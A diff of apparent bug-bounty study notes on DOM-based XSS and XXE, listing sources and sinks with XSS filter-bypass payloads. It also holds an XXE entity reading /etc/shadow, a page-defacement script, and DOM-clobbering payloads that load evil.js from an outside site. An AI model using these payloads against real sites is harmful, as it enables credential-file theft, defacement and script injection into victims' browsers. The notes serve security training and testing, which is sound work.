@@ -18,76 +18,63 @@ XSS type that occurs when user input is directly shown in the browser and is com
 To further understand the nature of the DOM-based XSS vulnerability, we must understand the concept of the Source and Sink of the object displayed on the page. The Source is the JavaScript object that takes the user input, and it can be any input parameter like a URL parameter or an input field, as we saw above.
 
 On the other hand, the Sink is the function that writes the user input to a DOM Object on the page. 
+The source is the property that is read from the DOM:
 ```
-    document.write()
-    DOM.innerHTML
-    DOM.outerHTML
+document.URL
+document.documentURI
+location
+location.href
+location.search
+location.hash
+
+document.referrer
+
+window.name
+```
+Sinks, on the other hand are the points in the flow of data at which the untrusted input gets outputted on the page or executed by JavaScript within the page.
+```
+eval
+setTimeout
+setInterval
+
+document.write
+document.writeIn
+
+innerHTML
+outerHTML
+
+window.location
+document.location
+location.href
 
 jQuery library functions that write to DOM objects are:
     add()
     after()
-    append()
+    append() 
 ```
-
 ------------------------------------------
+# BASICS
 
-## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="80" height="80"> xss bypass
-### <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/gun1.png" width="40" height="20"> innerHTML 
-The innerHTML function does not allow the use of the <script> tags within it as a security feature
-```javascript
-document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);
-```
-As alternative it can be used something like
-```javascript
-<img src="" onerror=alert(window.origin)>
-```
-
-### <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/gun1.png" width="40" height="20"> else
-```js
-<<a|ascript>alert('xss')</script>
-```
-
-##  Deprecated Interface XXE injection
-Use a deprecated B2B interface that was not properly shut down. XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data.
-- search xxe payload
-- look for POST requests
-```xml
-<!--?xml version="1.0" ?-->
-<!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///etc/shadow"> ]>
-<userInfo>
- <firstName>John</firstName>
- <lastName>&xxe;</lastName>
-</userInfo>
-```
---------------------------------------------
-
-## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="80" height="80"> Tags bruteforcing
-- [How to search for XSS (with blacklisted HTML tags)](https://www.youtube.com/watch?v=0kfQsRwr_Bc)
-- [portswigger/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
-
-#### steps 
-Searching for allowed tags to be inserted in the search field as parameter
-1. 'insertpayloadhere' in the field
-2. intercept with burp and send to intruder
-3. add the tag list to the payload in the intruder settings
-4. brute force and look for the 200, we're looking for a tag which allow to have <script> </script>
-5. once the tag has been found you need to search for the event eg:onbegin
-6. in the search field we will use url encoding: 
-```
-%3C -> < 
-%3E -> >
-%20 -> space
-%3Csvg%3E%3Canimatetransform%20onbegin%3Dalert%28%22xss%22%29%3E
-```
-
-## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="80" height="80"> Waf bypass with anchor
-- [Two solutions for the January 2021 Initigriti XSS Challenge](https://www.youtube.com/watch?v=Wbovgw3Qxxc)
-```
-onmouseover=alert(document.location.has.substring(1))#payloadhere
-```
 
 ## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="80" height="80"> DOM XSS
 - paper: http://www.webappsec.org/projects/articles/071105.shtml
+#### xample of DOM-based XSS
+```html
+<html>
+<head><title>DOMXSS</title></head>
+</body>
+Select your language:
+<select><script>
+document.write("<OPTION value=1>"+document.location.href.substring(document.location.href.indexOf("default=")+8)+"</OPTION>");
+document.write("<OPTION value=2>English</OPTION>");
+</script></select>
+</body>
+</html>
+```
+Attack:
+```url
+http://www.example.com/dom-xss?default=<script>alert("DOM XSS");</script>
+```
 #### How to use it:
 - you need to share with the victim the url containing the xss. 
 
@@ -118,6 +105,75 @@ For example, this will trigger a xss on error, which will occur because src is e
  auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>
  ```
 
+------------------------------------------
+# EXTRAS
+
+## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="80"> Discovery Xss
+#### Automated
+- Nessus, Burp Pro, or ZAP,  XSS Strike, Brute XSS, and XSSer
+```bash 
+python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
+```
+
+## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="80" height="80"> xss bypass
+### <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/gun1.png" width="40" height="20"> innerHTML 
+The innerHTML function does not allow the use of the <script> tags within it as a security feature
+```javascript
+document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);
+```
+As alternative it can be used something like
+```javascript
+<img src="" onerror=alert(window.origin)>
+```
+
+### <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/gun1.png" width="40" height="20"> else
+```js
+<<a|ascript>alert('xss')</script>
+```
+
+##  Deprecated Interface XXE injection
+Use a deprecated B2B interface that was not properly shut down. XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data.
+- search xxe payload
+- look for POST requests
+```xml
+<!--?xml version="1.0" ?-->
+<!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///etc/shadow"> ]>
+<userInfo>
+ <firstName>John</firstName>
+ <lastName>&xxe;</lastName>
+</userInfo>
+```
+
+## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="80" height="80"> Defacing website
+
+```js
+<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>
+```
+## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="80" height="80"> Tags bruteforcing
+- [How to search for XSS (with blacklisted HTML tags)](https://www.youtube.com/watch?v=0kfQsRwr_Bc)
+- [portswigger/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
+
+#### steps 
+Searching for allowed tags to be inserted in the search field as parameter
+1. 'insertpayloadhere' in the field
+2. intercept with burp and send to intruder
+3. add the tag list to the payload in the intruder settings
+4. brute force and look for the 200, we're looking for a tag which allow to have <script> </script>
+5. once the tag has been found you need to search for the event eg:onbegin
+6. in the search field we will use url encoding: 
+```
+%3C -> < 
+%3E -> >
+%20 -> space
+%3Csvg%3E%3Canimatetransform%20onbegin%3Dalert%28%22xss%22%29%3E
+```
+
+## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="80" height="80"> Waf bypass with anchor
+- [Two solutions for the January 2021 Initigriti XSS Challenge](https://www.youtube.com/watch?v=Wbovgw3Qxxc)
+```
+onmouseover=alert(document.location.has.substring(1))#payloadhere
+```
+
 ## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="80" height="80">  Exploiting DOM clobbering to enable XSS
 - [Two solutions for the January 2021 Initigriti XSS Challenge]([https://www.youtube.com/watch?v=Wbovgw3Qxxc](https://youtu.be/Wbovgw3Qxxc?t=912))
 - [portswigger/dom-based/dom-clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)
@@ -137,7 +193,6 @@ DOM Clobbering use the HTMLCollection vulnerability which allow you to add to th
   - ```<a id=defaultAvatar><<a id=defaultAvatar name=avatar href='cid:"onerror=alert(1)//)"'>```
   - ```<a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js>```
 
-
 ## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="80" height="80"> Videos:
 - xss API [video](https://youtu.be/xH8WbuApFXw?t=2358)
   - filtering and sanitazation come frontend back end.
@@ -147,6 +202,7 @@ DOM Clobbering use the HTMLCollection vulnerability which allow you to add to th
 - [XXE Lab Breakdown: Exploiting XXE using external entities to retrieve files](https://www.youtube.com/watch?v=71dZaGfOVqw)
 - [How to search for XXE!](https://www.youtube.com/watch?v=0DQnWalxYb4)
 - [Web App Testing: Episode 3 - XSS, SQL Injection, and Broken Access Control](https://www.youtube.com/watch?v=azYwfI26oXo&list=PLLKT__MCUeixCoi2jtP2Jj8nZzM4MOzBL&index=3)
+- [🚀 Cross Site Scripting ( XSS ) Vulnerability Payload List 🚀](https://github.com/payloadbox/xss-payload-list)
 
 
  
